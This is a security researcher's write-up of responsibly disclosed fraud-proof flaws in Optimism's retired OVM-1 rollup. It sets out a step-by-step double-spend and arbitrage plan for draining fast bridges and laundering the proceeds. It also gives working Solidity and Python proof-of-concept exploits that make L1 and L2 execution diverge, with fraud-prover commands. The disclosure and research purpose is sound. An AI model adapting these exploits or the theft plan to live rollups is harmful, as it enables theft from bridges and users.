![0_M5BmOmzkwV-zX4Pg](/Users/mac/Desktop/0_M5BmOmzkwV-zX4Pg.webp)

Wait a minute. Wait a minute Doc, are you telling me you built a **time** machine out of a DeLorean?”

In this post I am going to introduce two classes of attacks against optimistic rollups — time travel attacks, and reality distortion attacks. I will demonstrate these attacks using OVM 1, an obsolete implementation which Optimism has retired in November 2021.

The purpose of this post is to highlight the significance of fraud-proofs security research and to provide a frame of thinking when approaching fraud-proof bounties.

# Optimistic rollups and fraud proofs

[Optimistic rollups](https://ethereum.org/en/developers/docs/scaling/optimistic-rollups/) scale Ethereum by using the L1 (a.k.a. Ethereum mainnet) network mostly for storage, doing the expensive computations elsewhere. It is assumed that the sequencer performs those computations correctly, because it locked a bond that it would forfeit if the results are incorrect.

If the sequencer submits a fraudulent state transition, an L1 fraud proof contract can be used to prove the fraud, undo the transition and slash the sequencer. A state transition is considered fraudulent if the submitted transactions, when applied to the previous state, do not result in the new state attested by the sequencer.

Upon a successful fraud proof the chain rolls back to its pre-fraud state, and then it gets rolled forward by replaying the same transactions in the same order, using the correct state.

Fraud proofs are tricky to implement. They involve simulating EVM execution with arbitrary state and inputs on EVM itself, and must always reach the same result as the L2 execution. They must not have corner cases where execution differs.

Optimism’s fraud proofs implementation in OVM-1 is described in a [great post](https://research.paradigm.xyz/optimism) by Georgios Konstantopoulos. The technical sections of my post assume some familiarity with it.

# Motivation: time-traveling the blockchain

In this section I’ll explain the implications of a malicious fraud proof, and how an attacker could use it to cause maximum damage and extract maximum value by carefully planned time-traveling.

![1_4sEoyjE-hQeJkWGMzpTkiQ](/Users/mac/Desktop/1_4sEoyjE-hQeJkWGMzpTkiQ.webp)



Great Scott!

Normally transactions are processed on L2, but when they are challenged by a fraud proof, they are reprocessed on L1 as part of the proof. To avoid fraud proof, these two flows must have identical results.

Time travel attacks work by creating transactions that modify the state in one way during normal L2 processing, and in another during the fraud proof. A retroactive state change during reprocessing could have a cascading effect on everything that happened afterwards. By selectively changing the past, we can change the present and the future.

OVM-1 had multiple vulnerabilities that could be used to inject a seemingly legitimate transaction through the sequencer, and then prove their resulting state as fraudulent on L1. This was made worse by the fraud-prover service [implementation](https://github.com/ethereum-optimism/optimism-ts-services/blob/3cf3c11ee5a6b39eedd2b4f2895137e109f7970b/src/services/fraud-prover.service.ts) not attempting L1 simulation, and relying on L2 execution, so it failed to detect these transactions as fraudulent. As a result, an attacker could plant the transaction, wait up to 7 days — the fraud proof window — and roll the chain back to that point by producing an L1 fraud proof.

Here’s how Doc implements a basic *double-spending* attack:

1. Send as much ETH as he can obtain to L2 before the attack, to Account_1.
2. Inject a fraudulent transaction as demonstrated below. The transaction moves the ETH to Account_2 when executed in L2, but reverts when simulated on L1 during a fraud proof (or vice versa, Account_1 and Account_2 could be inverted, depending on which of the exploits below is used — whether the revert happens on L2 or in the L1 simulation).
3. Withdraw the ETH from the account that has it, through [*Fast Bridges*](https://www.optimism.io/apps/bridges). The canonical bridge would be of no use during the attack, because it is subject to the 7-day delay, but bridges such as [Hop](https://app.hop.exchange/#/send?token=ETH), [Connext](https://connext.network/) and [Celer](https://cbridge.celer.network/#/transfer), are willing to take the risk and release funds to L1 without this delay. At this point, Doc’s funds are already safe on L1 (minus fees) before the attack has started.
4. Send another transaction using Account_1 (the account that no longer has the funds), attempting to send the same amount to L1 through the canonical bridge. This transaction should revert on L2 at this point, due to lack of funds.
5. Wait 6 days.
6. Submit a fraud proof, rolling the chain back by 6 days. At this point the chain’s state is 6 days behind, and users are unable to submit transactions through the sequencer because it is out of sync until it is fixed to submit the state root that matches the L1 simulation (changing the outcome of the fraudulent transaction). If the sequencer tries to come back up and roll the chain forward with the old state root, Doc will just keep re-slashing it and taking its bond.
7. Eventually the sequencer comes back online and replays the chain, with Doc’s first transaction resulting in the state root determined by the L1 simulation.
8. At this point, Doc has doubled his funds. The result of the transfer from Account_1 to Account_2 has changed, so the subsequent Fast Bridge transfers are reverted due to lack of funds. Doc has his original funds on L1, but the Fast Bridge transfers on L2 were retroactively reverted, so he also has the funds on L2. The Fast Bridges liquidity pools have been drained.
9. When the chain is replayed after the fix, the change in the outcome of the 1st transaction has a cascading effect, also changing the outcome of the 2nd transaction. Account_1 now has the funds, so the previously reverted transfer to the canonical bridge now succeeds.
10. A day later, the 7-day window is over, and the funds from the canonical bridge are released on L1. Doc has doubled his ETH on L1, successfully robbing the Fast Bridges.

But Doc is greedy and wants more than 2X profit, so he proceeds to the bonus rounds:

1. The chain traveled 6 days back in time, opening major arbitrage opportunities against current token prices. Just after the bridge withdrawal, Doc picks a high-volatility, high-volume token. Doc doesn’t send the 2nd transaction above (the one that sent the funds to the canonical bridge), and replaces it with a trade on Uniswap by Account_1, attempting the buy a large quantity of the token at the current price. The trade reverts due to lack of funds in Account_1.
2. During the next 6 days, Doc monitors the token price. If the token price is down, Doc does nothing, waits another day for the fraud window to expire, and starts the attack from scratch.
3. If the token price increases significantly during the 6 days, Doc sends another trade, attempting to sell the tokens at the current price. This trade reverts because doc doesn’t actually have the tokens.
4. Doc finally sends the fraud proof and waits for the sequencer to be fixed, and for the chain to be replayed with the altered state.
5. During replay, the 1st transaction’s result changes, starting the cascade effect. The 2nd transaction — buying the token 6 days ago, now succeeds because the funds are available in Account_1. Doc now has the tokens, and the token price on Uniswap goes up as a result of the trade. Many subsequent replayed trades made by other users during these 6 days revert because their limit no longer matches the token price on Uniswap. The last trades succeed when their price limit matches the new price created by Doc’s retroactive trade. The token finally reaches its current price. Then the 3rd transaction is replayed, selling Doc’s tokens at the current price.
6. Doc did much better than 2X. He double-spent his ETH but also used the double-spent funds to retroactively exploit a 6-day arbitrage, *frontrunning* all the other traders. Any further trades made by these users will probably fail as well, since their replayed transactions no longer match the assets they hold.
7. If Doc gets really greedy, he can create arbitrarily complex post-exploit sequences of transactions, attacking different DeFi protocols. For example, he could exploit arbitrage opportunities only in the first 3 days to amass a lot of ETH. Then he would use it to manipulate token prices, trigger liquidations in some collateralized protocols, and collect these liquidations. Doc would successfully frontrun everyone else because the liquidations happen 3 days in the past, and only Doc was there to take them.
8. Similarly, he exploits options protocols such as Synthetix by selectively buying options 6 days ago. With time-travel, the possibilities in DeFi seem endless.
9. Finally, instead of sending the proceeds to the canonical bridge, Doc pushes all the newly acquired ETH to Tornado Cash on L2 at the end of the conditional sequence, so that the addresses can’t be blacklisted by the bridge after the network is fixed.
10. When the network is back running, Doc slowly withdraws the ETH from Tornado and sends it to L1.

This entire movie-plot attack would probably fail because the L1 contracts are still centrally upgradable, and the upgrade could fix the fraud proof contract rather than the sequencer, ensuring that the state remains intact during replay. Or the upgrade could temporarily disable fraud proofs and replay the chain with the same state.

However that’s not something the community should rely on. At some point the rollups will be decentralized, and rolling back the chain to undo an attack will become infeasible. We need fraud proofs to be reliable enough to never require centralized rollback to bail it out.

Having established why we should care, let’s move on to explore actual vulnerabilities.

# Two classes of vulnerabilities

During my research, I focused on two kinds of vulnerabilities:

1. Time-traveling attacks by an anonymous user.
2. Reality-distortion attacks by a malicious sequencer.

In the next sections I will demonstrate attacks of both kinds.

# Time-traveling attacks by an anonymous user

Proving fraud of a legitimate state transition enables chain reverts and time-traveling as explained above. This class of attacks is the riskiest, because it could be performed by any anonymous user on the network.

## The simplest one: storage gas cost differences

OVM-1 consisted of an l2geth (for L2 execution) and a set of OVM contracts (for L1 simulation). One place where the two differ a lot is the state manager. For example, [OVM_StateManager](https://github.com/ethereum-optimism/optimism/blob/ed2ff66d014666cb27b363026a2ceb6c971cb647/packages/contracts/contracts/optimistic-ethereum/OVM/execution/OVM_StateManager.sol).sol implements SSTORE/SLOAD for L1 in an [exotic way](https://github.com/ethereum-optimism/optimism/blob/ed2ff66d014666cb27b363026a2ceb6c971cb647/packages/contracts/contracts/optimistic-ethereum/OVM/execution/OVM_StateManager.sol#L463) which differs from the [L2 implementation](https://github.com/ethereum-optimism/optimism/blob/ed2ff66d014666cb27b363026a2ceb6c971cb647/l2geth/core/vm/ovm_state_manager.go#L121). Therefore, the gas behavior of any contract that uses storage will differ between L1 and L2. The same goes for other functions implemented in [ovm_state_manager.go](https://github.com/ethereum-optimism/optimism/blob/ed2ff66d014666cb27b363026a2ceb6c971cb647/l2geth/core/vm/ovm_state_manager.go).

This can be exploited by either accessing `gasleft()` directly, or by using a call with a gas limit that would cause an out-of-gas revert only on one of them.

This was my first fraud proof exploit, using this trivial contract:

```
1 // SPDX-License-Identifier: MIT
2 pragma solidity >0.6.0 <0.8.0;
3
4 contract Evil {
5    event Debug(uint256 x);
6 
7    uint256 public gas1;
8    uint256 public gas2;
9
10    constructor() {
11        gas1 = gasleft();
12        gas2 = gasleft();
13        emit Debug(gas1-gas2);
14    }
15}
```

The number emitted by this contract on L1 and on L2 differs due to the gas consumed when storing `gas1`. It also results in a different state root, due to a different number being stored in `gas2`.

To exploit it, I needed a fraud prover that would simulate the transaction on L1. Unfortunately, the [fraud prover](https://github.com/ethereum-optimism/optimism-ts-services/blob/2fc4521af2efc20932f219d53973c9a68ff6e21d/src/services/fraud-prover.service.ts) in the repo compared the state root to the one reported by l2geth, and therefore wouldn’t trigger the L1 simulation. I [patched](https://gist.github.com/yoavw/bdf6d532b75ede6f60ca8404a7131335) it to accept a FORCE_BAD_ROOT environment variable, making it “see” a different state root in the specified block number and attempting to prove it on L1. This patched prover is used in all the demos below.

The actual exploit:

```
1 #!/usr/bin/env python3
2
3 # Create a simple contract that saves gas() to storage.  Storage gas behaves differently on L1 and on L2, resulting in a successful fraud proof.
4
5 bytecode="0x60806040523480156100195760008061001661008a565b50505b505a600081906100276100f8565b5050505a600181906100376100f8565b5050507f8a36f5a234186d446e36a7df36ace663a05a580d9bea2dd899c6dd76a075d5fa600161006561015d565b600061006f61015d565b036040518082815260200191505060405180910390a16101c0565b632a2a7adb598160e01b8152600481016020815285602082015260005b868110156100c55780860151816040840101526020810190506100a7565b506020828760640184336000905af158600e01573d6000803e3d6000fd5b3d6001141558600a015760016000f35b505050565b6322bd64c0598160e01b8152836004820152846024820152600081604483336000905af158600e01573d6000803e3d6000fd5b3d6001141558600a015760016000f35b60005b60408110156101585760008183015260208101905061013e565b505050565b6303daa959598160e01b8152836004820152602081602483336000905af158600e01573d6000803e3d6000fd5b3d6001141558600a015760016000f35b8051935060005b60408110156101bb576000818301526020810190506101a1565b505050565b610174806101cf6000396000f3fe6080604052348015610019576000806100166100a3565b50505b506004361061003f5760003560e01c806351c4bb971461004d578063ffe20fb41461006b575b60008061004a6100a3565b50505b610055610089565b6040518082815260200191505060405180910390f35b610073610096565b6040518082815260200191505060405180910390f35b6001610093610111565b81565b60006100a0610111565b81565b632a2a7adb598160e01b8152600481016020815285602082015260005b868110156100de5780860151816040840101526020810190506100c0565b506020828760640184336000905af158600e01573d6000803e3d6000fd5b3d6001141558600a015760016000f35b505050565b6303daa959598160e01b8152836004820152602081602483336000905af158600e01573d6000803e3d6000fd5b3d6001141558600a015760016000f35b8051935060005b604081101561016f57600081830152602081019050610155565b50505056"
6 abi=[{'inputs': [], 'stateMutability': 'nonpayable', 'type': 'constructor'}, {'anonymous': False, 'inputs': [{'indexed': False, 'internalType': 'uint256', 'name': 'x', 'type': 'uint256'}], 'name': 'Debug', 'type': 'event'}, {'inputs': [], 'name': 'gas1', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}, {'inputs': [], 'name': 'gas2', 'outputs': [{'internalType': 'uint256', 'name': '', 'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}]
7
8 from web3.auto.http import w3
9 from eth_abi.packed import encode_single_packed
10 from eth_abi import encode_abi
11 import eth_account.messages
12 from web3.middleware import geth_poa_middleware
13 
14 w3.middleware_onion.inject(geth_poa_middleware, layer=0)
15 w3.provider.endpoint_uri = 'http://localhost:8545/'
16 
17 def attack0():
18 	evil=w3.eth.contract(abi=abi, bytecode=bytecode)
19 	t = evil.constructor().buildTransaction({'value': 0, 'gas': 1999999, 'gasPrice': 0, 'chainId': 420, 'nonce': 0})
20	acct = w3.eth.account.create()
21 	rcpt = w3.eth.wait_for_transaction_receipt(w3.eth.sendRawTransaction(acct.signTransaction(t).rawTransaction))
22	block = rcpt['blockNumber']
23	print(f"Evil contract: {rcpt['contractAddress']}")
24	cmd=f"ADDRESS_MANAGER=0x3e4CFaa8730092552d9425575E49bB542e329981 L1_WALLET_KEY=0x754fde3f5e60ef2c7649061e06957c29017fe21032a8017132c0078e37f6193a L2_NODE_WEB3_URL='http://localhost:8545/' L1_NODE_WEB3_URL='http://localhost:9545/' RUN_GAS_LIMIT=9500000 FROM_L2_TRANSACTION_INDEX={block-1} FORCE_BAD_ROOT={block} exec/run-fraud-prover.js"
25	print(cmd)
26
27 attack0()
```

And the successful fraud proof output can be seen [here](https://gist.github.com/yoavw/160d5dadb37fbd0d1ec04e69951edafd). The [marked section at the bottom](https://gist.github.com/yoavw/160d5dadb37fbd0d1ec04e69951edafd#file-ovm_exploit0-log-L136-L138) shows that it produced a different state root, and therefore the fraud proof was successful.

## Bypassing the whitelist deployer: non-contract attacks

When I was researching OVM-1 fraud proofs, OVM was already live on mainnet as a Synthetix specific chain (see timeline below) but in a limited way. Optimism was smart to use layers of defense for the Synthetix chain and for the later [mainnet soft launch](https://medium.com/ethereum-optimism/mainnet-soft-launch-7cacc0143cd5). The first line of defense was a whitelist deployer, preventing unauthorized users from deploying contracts. Therefore the trivial exploit above wouldn’t work on mainnet. I decided to focus my research on breaking OVM without deploying contracts, in order to breach the first line of defense. This meant finding system contracts in which I could trigger a fraud proof through a normal (non-create) transaction.

The simplest one was against OVM’s innovative account abstraction. OVM replaced EOA with an [ECDSA contract](https://github.com/ethereum-optimism/optimism/blob/ed2ff66d014666cb27b363026a2ceb6c971cb647/packages/contracts/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol) emulating the behavior of an EOA. This was a fine implementation of account abstraction, but it also introduced a vulnerability.

Normally, when an EOA sends a transaction with less than the minimum gas, the transaction is not mined and the chain state is not affected. But with account abstraction, the minimum required gas is much higher, and if gas is between the L1 minimum and the L2 minimum, the revert happens on-chain. Any transaction that has enough gas to apply (~25000) but not enough to fully execute the ECDSA contract (539745 for a simple transaction with no data) ends up behaving differently on L1 and L2.

On L2, EVM catches it as a revert at the account level. Nonce is not increased, gas payment is not transferred. On L1, the fee transfer and nonce increase succeed, the actual call fails because that’s where the user-specified gas limit is applied by the fraud proof simulation.

Therefore, the L1 (fraud proof) state is changed, but in L2 the transaction had no effect so the L2 state root remained identical to the previous batch despite the chain progressing, something that should never occur.

The exploit was as simple as sending an empty transaction with gas limit 25000, then submitting a fraud proof:

```
1 #!/usr/bin/env python3
2 
3 # The simplest attack so far.  Any transaction that has enough gas to apply (~25000) but not enough to fully execute (539745 for a simple transaction with no data, ends up behaving differently on L1 and L2.
4 # On L2 evm catches it as a revert, so the entire transaction reverts.  Nonce is not increased, and ERC20 gas is not transferred.
5 # On L1 the fee transfer and nonce increase succeed, the actual call fails (that's where the transaction gas limit applies) but the revert is in a library and is returned as a status rather than revert.  Status is not checked, so nonce ends up increased despite the call's revert.
6 
7 import sys
8 from web3.auto.http import w3
9 from eth_abi.packed import encode_single_packed
10 from eth_abi import encode_abi
11 import eth_account.messages
12 import json
13 import time
14 from web3.middleware import geth_poa_middleware
15 
16 w3.middleware_onion.inject(geth_poa_middleware, layer=0)
17 w3.provider.endpoint_uri = 'http://localhost:8545/'
18 
19 # 24000 no transaction
20 # 25000 works - 1
21 # 530000 works - 1
22 # 540000 fails - 2
23 def attack3(account1,gas=25000):
24 	print(account1.address)
25 	tx = w3.eth.sendRawTransaction(account1.signTransaction({'value': 0, 'gas': 1000000, 'gasPrice': 0, 'chainId': 420, 'data': '', 'to': '0x2222222222222222222222222222222222222222', 'nonce': w3.eth.getTransactionCount(account1.address)}).rawTransaction)  # deploy EOA if not there yet
26 	w3.eth.wait_for_transaction_receipt(tx)
27 	nonce = w3.eth.getTransactionCount(account1.address)
28	tx = w3.eth.sendRawTransaction(account1.signTransaction({'value': 0, 'gas': gas, 'gasPrice': 0, 'chainId': 420, 'data': '', 'to': '0x2222222222222222222222222222222222222222', 'nonce': w3.eth.getTransactionCount(account1.address)}).rawTransaction)
29	try:
30		w3.eth.wait_for_transaction_receipt(tx,5)
31	except:
32		print("Failed: not enough gas")
33		return
34	if w3.eth.getTransactionCount(account1.address) > nonce:
35		print("Failed: too much gas - nonce incremented")
36	else:
37		block = w3.eth.getBlock('latest')['number']
38		cmd=f"ADDRESS_MANAGER=0x3e4CFaa8730092552d9425575E49bB542e329981 L1_WALLET_KEY=0x754fde3f5e60ef2c7649061e06957c29017fe21032a8017132c0078e37f6193a L2_NODE_WEB3_URL='http://localhost:8545/' L1_NODE_WEB3_URL='http://localhost:9545/' RUN_GAS_LIMIT=9500000 FROM_L2_TRANSACTION_INDEX={block-1} FORCE_BAD_ROOT={block} exec/run-fraud-prover.js"
39		print(f"Success!  Run fraud prover:\n\n{cmd}")
40 
41 if len(sys.argv) > 1:
42 	gas = int(sys.argv[1])
43 else:
44	gas = 25000
45 attack3(w3.eth.account.create(),gas=gas)
```

The successful fraud proof output is available [here](https://gist.github.com/yoavw/9518419b5da00604cbba97325f28004c).

## Bypassing gas protection: nested transactions

In April 2021 I pulled the latest OVM version (tag v0.2.0) and saw that the non-contract, gas based exploits stopped working. That surprised me, because fixing the gas calculations in a single-round fraud proofs system seemed nearly impossible. A closer look revealed that the sequencer just started ignoring the user-specified gas limit and hardcoded it to 9000000, which eliminated a whole class of gas related attacks I previously implemented.

To fix my exploits, I needed them to work without relying on specifying my own gas limits. Luckily, account abstraction came to my aid again.

The ECDSA contract is normally called by the sequencer, but nothing stops it from being called by other contracts, or even by itself in a nested call. As long as the inner call includes the ECDSA signature of such EOA emulation, it can make a call from that account. This enables some fun transactions, such as a transaction that increments the nonce multiple times, or incrementing the nonces of multiple accounts within the same transaction.

As a side note, transaction-nesting also enabled creation of contracts from a secondary EOA during a fraud proof without going through the `ovmCREATE` checks, allowing the created contract to break out of the sandbox, whereas the same creation would fail on L2 due to the `ovmCREATE` checks. This attack is complex so we’ll stick to simpler ones in this post.

I used nesting to fix the above *ovm_exploit3.py*, crafting a multi-layer transaction involving multiple accounts. Given enough layers, one nonce will behave differently on L1 and L2:

```
1 #!/usr/bin/env python3
2 
3 # Variation that bypasses the 9000000 hardcoded gas limit by sending a multi-layer transaction, abusing the OVM account abstraction.  Each EOA sends a signed transaction to another EOA.
4 # Generate multiple accounts - one for each layer.  Send a multi-layer transaction that increases all their nonces.
5 # Given enough layers, one will behave differently on L1 and on L2, resulting in a different nonce.
6 
7 from web3.auto.http import w3
8 from eth_abi.packed import encode_single_packed
9 from eth_abi import encode_abi
10 import eth_account.messages
11 from web3.middleware import geth_poa_middleware
12 
13 w3.middleware_onion.inject(geth_poa_middleware, layer=0)
14 w3.provider.endpoint_uri = 'http://localhost:8545/'
15 
16 abi=[{'inputs': [{'internalType': 'bytes', 'name': '_transaction', 'type': 'bytes'}, {'internalType': 'enum Lib_OVMCodec.EOASignatureType', 'name': '_signatureType', 'type': 'uint8'}, {'internalType': 'uint8', 'name': '_v', 'type': 'uint8'}, {'internalType': 'bytes32', 'name': '_r', 'type': 'bytes32'}, {'internalType': 'bytes32', 'name': '_s', 'type': 'bytes32'}], 'name': 'execute', 'outputs': [{'internalType': 'bool', 'name': '_success', 'type': 'bool'}, {'internalType': 'bytes', 'name': '_returndata', 'type': 'bytes'}], 'stateMutability': 'nonpayable', 'type': 'function'}]
17 
18 def to_32byte(val):
19 	return w3.toBytes(val).rjust(32, b'\0')
20 
21 def wrap_transaction(inner_acct,inner_transaction,gas):
22 	if type(inner_transaction['data']) == str and inner_transaction['data'].startswith('0x'):
23 		inner_transaction['data'] = int(inner_transaction['data'],16)
24 	inner_message = encode_abi(["uint256", "uint256", "uint256", "uint256", "address" ,"bytes"],[inner_transaction['nonce'],inner_transaction['gas'],inner_transaction['gasPrice'],inner_transaction['chainId'],inner_transaction['to'],w3.toBytes(inner_transaction['data'])])
25 	message = eth_account.messages.SignableMessage(version=b'\x19',header=b"Ethereum Signed Message:\n32",body=w3.toBytes(inner_message))
26 	body_hashed_as_bytes = eth_account.messages.keccak(inner_message)
27 	signed_message = inner_acct.signHash(w3.toHex(eth_account.messages.keccak(encode_single_packed('(bytes,bytes32)',[message.version+message.header,body_hashed_as_bytes]))))
28 	eoacon = w3.eth.contract(address=inner_acct.address,abi=abi)
29 	execute_call_transaction = eoacon.functions.execute(inner_message,1,signed_message.v-27,to_32byte(signed_message.r),to_32byte(signed_message.s)).buildTransaction({'gasPrice':0})
30	execute_call_transaction['nonce'] = 1
31 	execute_call_transaction['gas'] = gas
32	execute_call_transaction['gasPrice'] = 0
33 	return execute_call_transaction
34 
35 accounts = []
36 
37 def add_acct():
38	new_acct = w3.eth.account.create()
39 w3.eth.wait_for_transaction_receipt(w3.eth.sendRawTransaction(new_acct.signTransaction({'value': 0, 'gas': 100000, 'gasPrice': 0, 'chainId': 420, 'data': '', 'to': '0x2222222222222222222222222222222222222222', 'nonce': w3.eth.getTransactionCount(new_acct.address)}).rawTransaction))  # deploy EOA if not there yet
40 	print(new_acct.address)
41	accounts.append(new_acct)
42	return new_acct
43
44 def add_layer(transaction,gas):
45	new_acct = add_acct()
46	return wrap_transaction(new_acct,transaction,gas)
47 
48 def finalize_transaction(transaction):
49 	new_acct = add_acct()
50 	return new_acct.signTransaction(transaction).rawTransaction
51 
52 def attack5(gas=500000,layers=13,padding=0):
53	inner_transaction = {'value': 0, 'gas': 1999999, 'gasPrice': 0, 'chainId': 420, 'data': b'\x00'*padding, 'to': '0x0000000000000000000000000000000000000001', 'nonce': 1}
54 	t = inner_transaction
55 	while(layers > 0):
56		layers = layers - 1
57		t = add_layer(t,gas)
58	final_transaction = finalize_transaction(t)
59 	w3.eth.wait_for_transaction_receipt(w3.eth.sendRawTransaction(final_transaction))
60	block = w3.eth.getBlock('latest')['number']
61	cmd=f"ADDRESS_MANAGER=0x3e4CFaa8730092552d9425575E49bB542e329981 L1_WALLET_KEY=0x754fde3f5e60ef2c7649061e06957c29017fe21032a8017132c0078e37f6193a L2_NODE_WEB3_URL='http://localhost:8545/' L1_NODE_WEB3_URL='http://localhost:9545/' RUN_GAS_LIMIT=9500000 FROM_L2_TRANSACTION_INDEX={block-1} FORCE_BAD_ROOT={block} exec/run-fraud-prover.js"
62	print(cmd)
63 
64 attack5()
```

The successful (albeit long) fraud proof output is available [here](https://gist.github.com/yoavw/3679ceadc8dd0ce1eef0bf8ed085fc69).

I implemented a couple more exploits in the anonymous non-contract category, but hopefully the ones above make it sufficiently clear that single-round fraud proofs are hard to secure.

Any of these exploits could have been used for time-traveling attacks.

# Reality-distortion attack by a malicious sequencer

An unprovable malicious state transition could alter the on-chain reality. If a legitimate transaction cannot be simulated, a malicious sequencer could abuse it to make an arbitrary state change, such as minting the entire L1 liquidity in the bridge to itself on L2 and starting a withdrawal to L1. This would only be exploitable as a rugpull by the sequencer operator, which is currently permissioned, but when the rollup is decentralized it could become a major issue.

## Unprovable fraud: abusing fraud-proof gas checks

In the final stage of the fraud proof, the prover must call [OVM_StateTransitioner.applyTransaction](https://github.com/ethereum-optimism/optimism/blob/8d67991aba584c1703692ea46273ea8a1ef45f56/packages/contracts/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L323) to simulate the transaction. The state transitioner performs certain checks, such as [this gas check](https://github.com/ethereum-optimism/optimism/blob/8d67991aba584c1703692ea46273ea8a1ef45f56/packages/contracts/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L340), causing it to revert if conditions are not met.

Furthermore, `OVM_ExecutionManager.run` called by `OVM_StateTransitioner.applyTransaction` actually calls the user transaction with [less gas](https://github.com/ethereum-optimism/optimism/blob/8d67991aba584c1703692ea46273ea8a1ef45f56/packages/contracts/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L209) than the user-specified amount.

If a valid L2 transaction makes it impossible to complete `applyTransaction` on L1 without reverting, then the sequencer would be able to attest to an arbitrary state root. Everyone will be able to tell that it is wrong, but it will be impossible to prove it on chain and undo it. The sequencer could exploit this, minting itself any amount of L2 tokens and then sending them to L1 through the canonical bridge, effectively draining the bridge.

OVM tried to prevent this by [limiting the gas](https://github.com/ethereum-optimism/optimism/blob/8d67991aba584c1703692ea46273ea8a1ef45f56/packages/contracts/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1696), but this limitation is applied too late, in `OVM_ExecutionManager.run`, so it doesn’t take calldata size into account. It is therefore possible to create a transaction that uses slightly less than the maximum gas but also has calldata padding, making it impossible to simulate on L1 due to mainnet block gas limit. The gas check during `applyTransaction` will always revert for such transaction because even if the L1 transaction started with `gasleft()` as high as the block gas limit, it still won’t satisfy *(gasleft() >= 100000 + _transaction.gasLimit \* 1032 / 1000)* due to the pre-incurred calldata cost.

An easy way to exploit this is to use the above nested-transaction exploit and specify a large `padding` value. I won’t repeat the nearly identical code (available [here](https://gist.github.com/yoavw/3d36467216d7f798d6715f2d1e71a293) for completeness), but [here](https://gist.github.com/yoavw/e14f4f7d940e3da649d3c742372f5fe5) is the failed fraud proof attempt. The important part in this output is the revert at the end: “[*Not enough gas to execute transaction deterministically.*](https://gist.github.com/yoavw/e14f4f7d940e3da649d3c742372f5fe5#file-ovm_exploit8-log-L295)” which makes it impossible to complete the fraud proof.

This class of vulnerabilities demonstrates an important point: If fraud proofs become too complex, they could make full decentralization too risky. A malicious sequencer could corrupt and rugpull the entire rollup if it can make an unprovable state transition.

Fraud proofs shouldn’t have less security checks than normal execution, but they also shouldn’t have more security checks. They must behave identically.

# Timeline: How I came to explore time travel

![0_yBoZZJxiJ2pfglgl](/Users/mac/Desktop/0_yBoZZJxiJ2pfglgl.jpg)

I’ve been fascinated with the idea of EVM fraud proofs since I first heard about them and realized the time-travel potential they carry if abused. I previously used fraud proofs in my own designs, e.g. [in GSN](https://github.com/opengsn/gsn/blob/f1e4cb6e73dcfc44fca95cb6f67ea630b8235d1b/packages/contracts/src/Penalizer.sol#L160), but applying fraud proofs to arbitrary code is a different level. Arbitrum [pioneered](https://www.youtube.com/watch?v=BpzrLOk4Zy0&ab_channel=CITPPrinceton) this idea in 2015, but full execution was not simulated on L1.

On 16 Jan 2021 Optimism [announced](https://medium.com/ethereum-optimism/mainnet-soft-launch-7cacc0143cd5) the oncoming mainnet launch and I got curious about how they tackled the incredible complexity of single-round fraud proofs, so I just had to take a close look.

Optimism planned to go live on mainnet in April 2021, but then I realized that it was [already on mainnet](https://blog.synthetix.io/l2-mainnet-launch/) with an app-specific chain for Synthetix, having more than $100M worth of SNX staked through its [L2 bridge](https://etherscan.io/address/0x045e507925d2e05d114534d0810a1abd94aca8d6/advanced#tokentxns) shortly after its launch. This added some urgency to my curiosity. I spent the next two months full-time digging deep into the platform.

In the course of this research I found some vulnerabilities and implemented proof-of-concept exploits, such as the ones in this post.

Since there were already funds at risk, it was important to practice responsible disclosure. There was no Optimism bounty at the time (they have a [great one](https://immunefi.com/bounty/optimism/) now), and I didn’t know the team so I wasn’t sure how to safely report the issues. Finally, in April 2021 Vitalik introduced me to the Optimism team (thanks!) and we had a long telegram chat followed by a zoom call to discuss the OVM security model. The team was very attentive and transparent, and I really enjoyed discussing fraud proofs security with like-minded researchers.

OVM-1 fraud proofs were disabled on mainnet, eliminating all the associated risks. To be enabled soon, in a much better form — Cannon!

I’d like to also use the opportunity to thank Optimism for the retroactive grant for my security research. Retroactive grants are a perfect fit for supporting research.

# Single-round vs. interactive fraud proofs

Fraud proofs can be implemented in two ways: a single-round simulation or as an interactive verification game. The former is simpler to implement, but as shown above, has certain security and usability drawbacks.

In single-round proofs, the prover reconstructs the required subset of the last good state before the fraudulent transaction, proves it against the state root of the last good transaction, and then simulates the entire fraudulent transaction within a single transaction. Optimism implemented this approach in [OVM-1](https://research.paradigm.xyz/optimism).

In interactive proofs, the prover and the sequencer engage in a verification game, proving the execution. When they reach the point of disagreement — a single instruction where their results differ — they only need to simulate that instruction on-chain, using its inputs and comparing its output. Most of the verification happens off-chain, but with an on-chain mechanism to ensure timely participation of both parties. Arbitrum implemented this approach in AVM as described [here](https://developer.offchainlabs.com/docs/inside_arbitrum), and Optimism is implementing it in OVM-2 [using Cannon](https://twitter.com/ben_chain/status/1488275950877872128?).

Single-round proofs have a significantly larger attack surface. The contract’s state machine consists of the entire executed transaction, so the number of possible states is only bound by the number of possible execution flows in EVM. All the complexities and corner cases of EVM come into play. Interactive proofs, on the other hand, only simulate a single opcode, so the number of states is bound by the number of architecture opcodes and their possible inputs. Arbitrum’s [OneStepProof.sol](https://github.com/OffchainLabs/arbitrum/blob/9483d8de5bb9ea4c4d4f71804a512976dd259493/packages/arb-bridge-eth/contracts/arch/OneStepProof.sol), for example, only needed to prove 79 opcodes — probably small enough to achieve full test coverage of the state machine.

Single-round proofs also impose a limit on the gas used by a transaction, as it needs to be simulated inside another transaction. This introduces usability problems such has limiting contract size and not being able to perform certain EVM flows that are possible on L1. Optimism switching to interactive proofs in OVM-2 enabled EVM equivalence, which was impossible with OVM-1. This switch is the right design choice, for many reasons.

*The exploits demonstrated in this post were implemented against OVM-1. At the time of writing this, there are no published unpatched OVM-2 vulnerabilities.*

# Cannon: OVM-2 fault proofs

Optimism recently [announced Cannon](https://medium.com/ethereum-optimism/cannon-cannon-cannon-introducing-cannon-4ce0d9245a03), the interactive fault proofs (formerly known as fraud proofs) implementation built by geohot.

